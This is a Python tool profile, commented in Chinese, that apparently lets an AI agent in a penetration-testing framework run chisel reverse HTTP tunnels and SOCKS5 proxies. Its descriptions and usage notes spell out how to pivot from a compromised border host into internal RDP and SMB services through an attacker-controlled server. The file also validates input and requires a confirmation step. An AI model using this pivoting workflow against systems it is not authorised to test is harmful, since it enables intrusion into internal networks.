"""chisel 深度定制：HTTP 隧道穿透（危险操作，触发确认）。"""

from __future__ import annotations

import re
from typing import Any

from .base import ToolProfile, check_installed, sanitize_int

SCHEMAS: list[dict[str, Any]] = [
    {
        "type": "function",
        "function": {
            "name": "chisel_tunnel",
            "description": (
                "用 chisel 建立 HTTP 隧道（反弹模式，穿透防火墙/边界）。"
                "⚠ 危险操作：会触发确认弹窗。"
                "典型场景：拿到边界主机后，建立隧道访问内网服务，或把内网端口暴露到本机。"
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "server": {
                        "type": "string",
                        "description": "chisel server 地址:端口（你控制的机器）",
                    },
                    "mode": {
                        "type": "string",
                        "enum": ["reverse", "forward"],
                        "description": "reverse=目标机回连你（默认，穿透出网）；forward=转发到目标内网",
                    },
                    "remote": {
                        "type": "string",
                        "description": "reverse: 'R:<本地端口>:<内网目标>:<内网端口>'；forward: '<本地端口>:<目标>:<端口>'",
                    },
                    "seconds": {
                        "type": "integer",
                        "description": "隧道保持秒数（默认 30，测试连通用；持久隧道让用户手动起）",
                    },
                    "socks": {
                        "type": "boolean",
                        "description": "开启 SOCKS5 代理（reverse 模式加 R:socks），默认 false",
                    },
                },
                "required": ["server", "mode", "remote"],
            },
        },
    },
]

_REMOTE_RE = re.compile(r"^R?:?\d{1,5}:[A-Za-z0-9.\-]+:\d{1,5}$|^R:socks$")


def _build_cmd(args: dict[str, Any]) -> tuple[str, int]:
    server = str(args.get("server") or "").strip()
    if not re.fullmatch(r"[\w.:-]{1,255}", server) or re.search(r"[;&|`$\\\s]", server):
        raise ValueError(f"server 格式非法: {server!r}")
    mode = str(args.get("mode") or "reverse").strip().lower()
    if mode not in ("reverse", "forward"):
        raise ValueError("mode 仅支持: reverse / forward")
    remote = str(args.get("remote") or "").strip()
    socks = bool(args.get("socks"))
    if not socks and not _REMOTE_RE.match(remote):
        raise ValueError(f"remote 格式非法（应为 R:端口:内网目标:端口 或 R:socks）: {remote!r}")
    seconds = sanitize_int(args.get("seconds"), 30, 5, 3600, "seconds")

    if socks:
        parts = ["chisel", "client", server, "R:socks"]
    elif mode == "reverse":
        parts = ["chisel", "client", server, remote]
    else:
        parts = ["chisel", "client", server, remote]
    return f"timeout {seconds} " + " ".join(parts), seconds + 15


class ChiselProfile(ToolProfile):
    name = "chisel"
    aliases = ["隧道", "chisel", "穿透", "端口转发", "socks 代理"]
    summary = "HTTP 隧道穿透"
    lore = """### chisel 深度使用要点
- 定位：目标机器能出网但入站被防火墙挡时，用反弹隧道打通。
- server 端：`chisel server --reverse --port 8080`（在你自己机器上先起好）。
- reverse 客户端：`chisel client <你的IP>:8080 R:8081:127.0.0.1:3389` → 你本机 8081 即目标 3389。
- R:socks 直接给你一个 SOCKS5 代理（本地 1080），配合 proxychains 打内网。
- forward 模式用于从边界机访问内网服务（如 RDP/SMB）。
- 隧道保持类操作用 timeout 限制时长；长期隧道建议用户开独立终端手动跑。"""
    extra_schemas = SCHEMAS

    async def exec_chisel_tunnel(self, ex: Any, args: dict[str, Any]) -> str:
        if not check_installed("chisel"):
            return (
                "chisel 未安装。下载：https://github.com/jpillora/chisel/releases "
                "（解压后放入 /usr/local/bin）。"
            )
        cmd, timeout = _build_cmd(args)
        raw = await self._run(ex, cmd, timeout=timeout)
        head = [l.strip() for l in raw.splitlines() if "server: session" in l or "Connected" in l]
        if not head:
            head = ["隧道未建立（server 未启动/地址不通/超时）。确认 chisel server 已在你机器上运行。"]
        else:
            head = ["🎯 隧道建立:"] + head[:5]
        return self._summary(raw, head, tail=30)
